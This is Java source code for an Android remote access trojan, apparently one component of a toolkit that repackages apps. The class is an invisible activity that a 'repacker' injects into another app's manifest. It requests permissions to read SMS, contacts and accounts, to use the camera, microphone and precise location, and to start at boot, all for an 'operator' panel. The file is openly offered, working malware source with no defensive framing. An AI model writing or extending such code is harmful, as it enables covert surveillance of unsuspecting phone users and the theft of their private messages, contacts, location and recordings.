package com.darkbiit.rat;

import android.Manifest;
import android.app.Activity;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;

import java.util.ArrayList;
import java.util.List;

/**
 * Invisible activity that requests the runtime permissions the RAT needs.
 *
 * It has no UI: it requests permissions, records the result in the service and
 * finishes. The repacker adds it to the merged manifest so the operator can
 * trigger it once after install (the panel can also launch it via the
 * "launch" command).
 */
public class RatPermissionActivity extends Activity {

    private static final int REQ = 0x5241;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestPermissions();
    }

    private void requestPermissions() {
        List<String> wanted = new ArrayList<String>();
        for (String p : permissions()) {
            if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
                wanted.add(p);
            }
        }
        if (wanted.isEmpty()) {
            finish();
            return;
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            requestPermissions(wanted.toArray(new String[0]), REQ);
        } else {
            finish();
        }
    }

    /** The permission set the payload needs. */
    public static String[] permissions() {
        return new String[] {
                Manifest.permission.INTERNET,
                Manifest.permission.ACCESS_NETWORK_STATE,
                Manifest.permission.ACCESS_WIFI_STATE,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_SMS,
                Manifest.permission.GET_ACCOUNTS,
                Manifest.permission.RECEIVE_BOOT_COMPLETED,
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VIDEO,
                Manifest.permission.READ_MEDIA_AUDIO,
                Manifest.permission.POST_NOTIFICATIONS,
        };
    }
}
